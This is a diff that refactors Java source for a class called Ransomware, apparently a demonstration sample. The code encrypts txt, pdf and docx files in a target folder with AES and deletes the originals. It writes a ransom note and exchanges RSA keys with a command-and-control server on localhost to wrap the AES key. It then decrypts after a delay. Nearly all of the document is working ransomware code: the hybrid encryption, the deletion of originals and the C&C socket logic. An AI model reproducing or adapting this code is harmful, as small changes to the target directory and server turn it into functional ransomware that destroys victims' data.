@@ -1,4 +1,4 @@
-=import java.io.BufferedWriter;
+import java.io.BufferedWriter;
 import java.io.File;
 import java.io.FileNotFoundException;
 import java.io.FileOutputStream;
@@ -31,22 +31,24 @@ import javax.crypto.spec.SecretKeySpec;
 public class Ransomware {
 	
 	// In milliseconds, how long to wait before things are decrypted.
-	private static final int DECRYPTION_DELAY = 10000;
+	private static final int DECRYPTION_DELAY = 60000;
 	private static final int IV_LENGTH = 16;
 	private static final String TARGET_DIR = System.getProperty("user.home") + "\\Desktop\\testFolder";
 	private static final String EXTENSION = ".RANSOM";
 	private static final int PORT_NUM = 2435;
-	private static final String RANSOM_TEXT = "You have been hit by ransomware! Your files"
-			+ "	will be decrypted soon, no need to send money :)";
+	private static final String RANSOM_TEXT = "You have been hit by ransomware! Your files will be "
+			+ "decrypted soon, no need to send money :)";
 	private static final String RANSOM_NAME = "RANSOM_INSTRUCTIONS.txt";
 	
 	private static List<String> targetedExtensions = new ArrayList<String>();
-	private static Cipher cipher = null, cipherRSA = null;
+	private static Cipher cipherAES = null, cipherRSA = null;
 	private static PublicKey publicKey = null;
 	private static PrivateKey privateKey = null;
 	private static byte[] encryptedSymmetricKey = null;
 	
 	public static void main(String [] args) {
+		// Connect to the C&C server
+		Socket clientSocket = createClientSocket();
 		
 		// Specify the file types to encrypt
 		final String[] ext = {"txt", "pdf", "docx"};
@@ -54,7 +56,7 @@ public class Ransomware {
 			targetedExtensions.add(s);
 		}
 		
-		createCiphers();
+		createAESCipher();
 		
 		// Get a list of files to encrypt
 		List<File> targetedFiles = new ArrayList<File>();
@@ -66,40 +68,11 @@ public class Ransomware {
 		encryptFiles(targetedFiles, key);
 		deleteOriginals(targetedFiles);
 		
-		Socket clientSocket = null;
-		try {
-			clientSocket = new Socket("localhost", PORT_NUM);
-		} catch (IOException e1) {
-			System.out.println("Could not create client socket.");
-		}finally {
-			if(clientSocket == null) {
-				System.out.println("Client socket is null.");
-				System.exit(1);
-			}
-		}
-		
 		createRSACipher();
-		
-		// Get the RSA public key from C&C server
-		try {
-			InputStream inputStream = clientSocket.getInputStream();
-			ObjectInputStream objectInputStream = new ObjectInputStream(inputStream);
-			PublicKeySer publicKeySer = (PublicKeySer) objectInputStream.readObject();
-			objectInputStream.close();
-			clientSocket.close();
-			publicKey = publicKeySer.getPublicKey();
-		} catch (IOException e) {
-			System.out.println("Could not create input stream.");
-			e.printStackTrace();
-			System.exit(1);
-		} catch (ClassNotFoundException e) {
-			System.out.println("Could not find class for the public key");
-			System.exit(1);
-		}
-		 
+		getRSAPublicKey(clientSocket);
 		initRSAEncryptionCipher();
 		
-		// Encrypt the symmetric key with the public key
+		// Encrypt the symmetric key with the RSA public key
 		try {
 			encryptedSymmetricKey = cipherRSA.doFinal(key.getEncoded());
 		} catch (IllegalBlockSizeException | BadPaddingException e1) {
@@ -107,65 +80,27 @@ public class Ransomware {
 			System.exit(1);
 		}
 		
-		// Try to delete the plaintext key 
-		// (No way to ensure that this happens with Java). 
+		/* 
+		 * Delete the plaintext AES key (might not work right away,
+		*  Java's garbage collector cannot be controlled...)
+		*/
 		key = null;
 		System.gc();
 		
-		System.out.println("Finished encryption. Decrypting files in " 
-		+ DECRYPTION_DELAY / 1000 + " seconds...\nDo not exit this "
-		+ "program or the files will be lost forever.");
-		try {
-			Thread.sleep(DECRYPTION_DELAY);
-		} catch (InterruptedException e) {
-			e.printStackTrace();
-		}
+		startWaiting();
 
-		System.out.println("The ransom has been paid. Decrypting...");
 		System.out.println("Connecting to C&C server for decryption key...");
 		
-		try {
-			clientSocket = new Socket("localhost", PORT_NUM);
-		} catch (IOException e1) {
-			System.out.println("Could not create client socket.");
-		}finally {
-			if(clientSocket == null) {
-				System.out.println("Client socket is null.");
-				System.exit(1);
-			}
-		}
+		// Reset the client socket
+		clientSocket = createClientSocket();
 		
-		try {
-			InputStream inputStream = clientSocket.getInputStream();
-			ObjectInputStream objectInputStream = new ObjectInputStream(inputStream);
-			PrivateKeySer privateKeySer = (PrivateKeySer) objectInputStream.readObject();
-			objectInputStream.close();
-			privateKey = privateKeySer.getPrivateKey();
-		} catch (IOException e) {
-			System.out.println("Could not create input stream.");
-			e.printStackTrace();
-			System.exit(1);
-		} catch (ClassNotFoundException e) {
-			System.out.println("Could not find class for the private key");
-			System.exit(1);
-		}
-		
+		getRSAPrivateKey(clientSocket);
 		initRSADecryptionCipher();
 		
-		byte[] symmetricKeyBytes = null;
-		try {
-			symmetricKeyBytes = cipherRSA.doFinal(encryptedSymmetricKey);
-		} catch (IllegalBlockSizeException | BadPaddingException e) {
-			e.printStackTrace();
-		}finally {
-			if(symmetricKeyBytes == null) {
-				System.out.println("Decrypted symmetric key is null.");
-				System.exit(1);
-			}
-		}
-		
+		byte[] symmetricKeyBytes = decryptAESKey();
 		SecretKey symmetricKey = new SecretKeySpec(symmetricKeyBytes, "AES");
 		
+		// Get a list of encrypted files
 		targetedFiles.clear();
 		getAllFiles(TARGET_DIR, targetedFiles, false);
 		
@@ -174,13 +109,29 @@ public class Ransomware {
 	}
 
 
-	private static void createCiphers() {
+	private static Socket createClientSocket() {
+		Socket clientSocket = null;
 		try {
-			cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
+			clientSocket = new Socket("localhost", PORT_NUM);
+		} catch (IOException e1) {
+			e1.printStackTrace();
+		}finally {
+			if(clientSocket == null) {
+				System.out.println("Client socket is null. Make sure to start the C&C server first!");
+				System.exit(1);
+			}
+		}
+		return clientSocket;
+	}
+
+
+	private static void createAESCipher() {
+		try {
+			cipherAES = Cipher.getInstance("AES/CBC/PKCS5Padding");
 		} catch (NoSuchAlgorithmException | NoSuchPaddingException e1) {
 			e1.printStackTrace();
 		}finally {
-			if(cipher == null) {
+			if(cipherAES == null) {
 				System.out.println("Could not create cipher instances.");
 				System.exit(0);
 			}
@@ -210,7 +161,6 @@ public class Ransomware {
 	
 	private static void placeRansomNote(File dir) {
 		String loc = dir.getAbsolutePath();
-		System.out.println("Creating ransom note: " + loc + "\\" + RANSOM_NAME);
 		File ransomFile = new File(loc + "\\" + RANSOM_NAME);
 		try {
 			BufferedWriter output = new BufferedWriter(new FileWriter(ransomFile));
@@ -246,9 +196,7 @@ public class Ransomware {
 	private static void encryptFiles(List<File> results, SecretKey key) {
 		for(File file: results) {
 			
-			/* Check to see if the file extension is
-			* in the allowed list.
-			*/
+			// Check to see if the file extension is in the allowed list.
 			String extension = getFileExtension(file.getName());
 			if(!targetedExtensions.contains(extension) || 
 					file.getName().equals(RANSOM_NAME)) {
@@ -259,7 +207,7 @@ public class Ransomware {
 			
 			// Initialize the encryption cipher with the key and IV
 			try {
-				cipher.init(Cipher.ENCRYPT_MODE, key, iv);
+				cipherAES.init(Cipher.ENCRYPT_MODE, key, iv);
 			} catch (InvalidKeyException | InvalidAlgorithmParameterException e) {
 				System.out.println("Could not init cipher for encryption.");
 				System.exit(1);
@@ -267,25 +215,21 @@ public class Ransomware {
 			
 			/*
 			 * Get the file data as a byte array and
-			 * then create an encrypted file from it.
+			 * then create a new encrypted file from it.
 			 */
 			byte[] data = getFileData(file);
 			if(data != null) {
 				byte[] encryptedData = encryptData(data);
 				File emptyFile = makeEmptyFile(file, true);
-				/*
-				 * Add the IV and then the encrypted data
-				 * to the encrypted file.
-				 */
+				
+				// Add the IV and then append the encrypted data to the new file.
 				addDataToFile(emptyFile, iv.getIV(), encryptedData);
 			}
 		}
 	}
 	
 	
-	/*
-	 * Delete the original, non encrypted files.
-	 */
+	// Delete the original, non encrypted files.
 	private static void deleteOriginals(List<File> results) {
 		for(File file: results) {
 			String extension = getFileExtension(file.getName());
@@ -332,14 +276,76 @@ public class Ransomware {
 		}		
 	}
 	
-	/* 
-	 * Loop through each file, get its data, decrypt it,
-	*  and then create a new file with the decrypted data.
-	*/
+	
+	private static byte[] decryptAESKey() {
+		byte[] symmetricKeyBytes = null;
+		try {
+			symmetricKeyBytes = cipherRSA.doFinal(encryptedSymmetricKey);
+		} catch (IllegalBlockSizeException | BadPaddingException e) {
+			e.printStackTrace();
+		}finally {
+			if(symmetricKeyBytes == null) {
+				System.out.println("Decrypted symmetric key is null.");
+				System.exit(1);
+			}
+		}
+		return symmetricKeyBytes;
+	}
+
+
+	private static void startWaiting() {
+		System.out.println("Finished encryption. Decrypting files in " 
+		+ DECRYPTION_DELAY / 1000 + " seconds...\nDo not exit this "
+		+ "program or the files will be lost forever.");
+		try {
+			Thread.sleep(DECRYPTION_DELAY);
+		} catch (InterruptedException e) {
+			e.printStackTrace();
+		}
+	}
+
+
+	private static void getRSAPrivateKey(Socket clientSocket) {
+		try {
+			InputStream inputStream = clientSocket.getInputStream();
+			ObjectInputStream objectInputStream = new ObjectInputStream(inputStream);
+			PrivateKeySer privateKeySer = (PrivateKeySer) objectInputStream.readObject();
+			objectInputStream.close();
+			privateKey = privateKeySer.getPrivateKey();
+		} catch (IOException e) {
+			System.out.println("Could not create input stream.");
+			e.printStackTrace();
+			System.exit(1);
+		} catch (ClassNotFoundException e) {
+			System.out.println("Could not find class for the private key");
+			System.exit(1);
+		}
+	}
+
+
+	private static void getRSAPublicKey(Socket clientSocket) {
+		try {
+			InputStream inputStream = clientSocket.getInputStream();
+			ObjectInputStream objectInputStream = new ObjectInputStream(inputStream);
+			PublicKeySer publicKeySer = (PublicKeySer) objectInputStream.readObject();
+			objectInputStream.close();
+			clientSocket.close();
+			publicKey = publicKeySer.getPublicKey();
+		} catch (IOException e) {
+			System.out.println("Could not create input stream.");
+			e.printStackTrace();
+			System.exit(1);
+		} catch (ClassNotFoundException e) {
+			System.out.println("Could not find class for the public key");
+			System.exit(1);
+		}
+	}
+	
+
 	private static void decryptFiles(List<File> results, SecretKey key) {
 		System.out.println("Decrypting your files...");
 		for(File file: results) {
-			// Only decrypt files with extension of EXTENSION
+			// Only decrypt files with extension of .RANSOM
 			String extension = getFileExtension(file.getName());
 			if(!extension.equals(EXTENSION.substring(1, EXTENSION.length()))) {
 				continue;
@@ -378,7 +384,7 @@ public class Ransomware {
 	private static void setIVOfDecryptionCipher(byte[] iv, SecretKey key) {
 		IvParameterSpec ivSpec = new IvParameterSpec(iv);
 		try {
-			cipher.init(Cipher.DECRYPT_MODE, key, ivSpec);
+			cipherAES.init(Cipher.DECRYPT_MODE, key, ivSpec);
 		} catch (InvalidKeyException | InvalidAlgorithmParameterException e) {
 			System.out.println("Could not init decryption cipher.");
 			System.exit(1);
@@ -399,7 +405,7 @@ public class Ransomware {
 
 	private static IvParameterSpec createRandomIV() {
 		SecureRandom random = new SecureRandom();
-		byte[] iv = new byte[cipher.getBlockSize()];
+		byte[] iv = new byte[cipherAES.getBlockSize()];
 		random.nextBytes(iv);
 		return new IvParameterSpec(iv);
 	}
@@ -437,7 +443,7 @@ public class Ransomware {
 	private static byte[] encryptData(byte[] data) {
 		byte[] encryptedData = null;
 		try {
-			encryptedData = cipher.doFinal(data);
+			encryptedData = cipherAES.doFinal(data);
 		} catch (IllegalBlockSizeException | BadPaddingException e) {
 			System.out.println("Could not encrypt data.");
 			e.printStackTrace();
@@ -451,7 +457,7 @@ public class Ransomware {
 	private static byte[] decryptData(byte[] encryptedData) {
 		byte[] data = null;
 		try {
-			data = cipher.doFinal(encryptedData);
+			data = cipherAES.doFinal(encryptedData);
 		} catch (IllegalBlockSizeException | BadPaddingException e) {
 			System.out.println("Could not encrypt data.");
 			e.printStackTrace();
